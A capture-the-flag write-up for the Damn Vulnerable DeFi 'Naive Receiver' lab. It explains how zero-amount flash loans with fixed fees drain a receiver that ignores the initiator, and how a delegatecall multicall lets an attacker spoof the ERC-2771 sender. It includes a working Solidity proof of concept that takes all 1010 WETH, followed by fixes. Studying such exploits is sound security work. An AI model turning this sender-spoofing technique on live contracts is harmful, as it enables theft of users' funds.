# Naive Receiver — Draining a Pool With a Forged Sender

**Challenge:** Damn Vulnerable DeFi v4 — Naive Receiver
**Category:** Access Control / Meta-Transaction Sender Spoofing + Unchecked Flash Loan Initiator
**Severity:** Critical (every token in the system is stolen, by anyone, in one transaction)

## What's going on

A pool holds 1000 WETH and offers flash loans with a flat 1 WETH fee. It supports
meta-transactions through a trusted forwarder. Separately, a user deployed a receiver
contract holding 10 WETH that can borrow from the pool. You start with nothing special,
and the goal is to move all 1010 WETH to a recovery account in at most 2 transactions.

There are two separate bugs here, and the exploit chains them together.

## Bug 1: anyone can bleed the receiver through fees

`flashLoan(receiver, token, amount, data)` lets the caller pick any `receiver`. The
receiver's `onFlashLoan` checks that the caller is the pool, but it ignores the
`initiator` argument, so it never checks who asked for the loan:

```solidity
function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
```

The fee is a fixed 1 WETH, charged even on a loan of 0. So anyone can force the receiver
to take 10 loans of 0 WETH and pay 10 WETH in fees, which empties it. Those fees are
credited to `deposits[feeReceiver]`, so the deployer now has 1000 + 10 = 1010 WETH of
deposit credit in the pool's books.

## Bug 2: `_msgSender()` can be spoofed through `multicall`

`withdraw` only checks `deposits[_msgSender()]`. The pool's `_msgSender()` trusts the
last 20 bytes of `msg.data` when the caller is the trusted forwarder:

```solidity
if (msg.sender == trustedForwarder && msg.data.length >= 20) {
    return address(bytes20(msg.data[msg.data.length - 20:]));
}
```

The forwarder is supposed to guarantee those 20 bytes are the real signer, by appending
`request.from` to the calldata. But the pool also inherits `Multicall`, which does:

```solidity
Address.functionDelegateCall(address(this), data[i]);
```

A delegatecall keeps `msg.sender` as the forwarder, so the pool still trusts the suffix,
but `msg.data` becomes `data[i]`, which the attacker wrote. The forwarder's appended
address is at the end of the outer call, not the end of each inner call. So the attacker
chooses the last 20 bytes of every inner call, and can make `_msgSender()` return any
address they like.

## The attack

1. Build 10 inner calls of `flashLoan(receiver, WETH, 0, "")`. The receiver's 10 WETH
   moves into the pool as fees, credited to the deployer.
2. Build one more inner call: `withdraw(1010 WETH, recovery)` with `bytes20(deployer)`
   appended. The pool thinks the deployer is withdrawing.
3. Wrap all 11 calls in one `multicall`, put it in a forwarder `Request` signed by the
   player, and call `forwarder.execute(...)`.
4. One player transaction: the pool and the receiver are both empty and `recovery` holds
   1010 WETH.

## PoC

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory calls = new bytes[](11);

    for (uint256 i = 0; i < 10; i++) {
        calls[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, bytes("")));
    }

    calls[10] = abi.encodePacked(
        abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes20(deployer)
    );

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 5_000_000,
        nonce: forwarder.nonces(player),
        data: abi.encodeCall(pool.multicall, (calls)),
        deadline: block.timestamp + 1 days
    });

    bytes32 digest = keccak256(
        abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);

    forwarder.execute(request, abi.encodePacked(r, s, v));
}
```

Full test file: `test/naive-receiver/NaiveReceiver.t.sol`

## Why I'm calling this Critical

- **Direct theft of all funds.** Not a DoS and not a griefing issue: 100% of the pool and
  the receiver ends up with the attacker.
- **No privileges needed.** The attacker only needs to sign a request as themselves.
- **One transaction, no capital.** Zero-amount flash loans cost the attacker nothing.
- **Both bugs are independently bad.** Bug 1 alone drains the receiver. Bug 2 alone lets
  anyone steal any account's deposit balance, since the attacker picks the victim address.

## Fix

- In `onFlashLoan`, check that `initiator` is the receiver's owner (or an allowlist), so
  strangers cannot trigger loans against it.
- Charge fees proportional to the borrowed amount, or reject zero-amount loans.
- Do not combine an ERC-2771 `_msgSender()` with a delegatecall-based `multicall` unless
  `multicall` re-appends the real sender to every inner call. OpenZeppelin's
  `ERC2771Context` and `Multicall` handle this by making the multicall context-aware.
- Consider requiring that the suffix is only trusted when `msg.data` was built by the
  forwarder for this exact call, not just when the caller is the forwarder.

## Takeaway

Whenever a contract uses a trusted-forwarder `_msgSender()` and also exposes `multicall`
through `delegatecall`, ask one question: can a caller control the tail of `msg.data`
while `msg.sender` is still the forwarder? If yes, every function guarded by `_msgSender()`
is spoofable. Separately, any flash loan receiver that ignores `initiator` can be
drained by fees, because anyone can make it borrow.
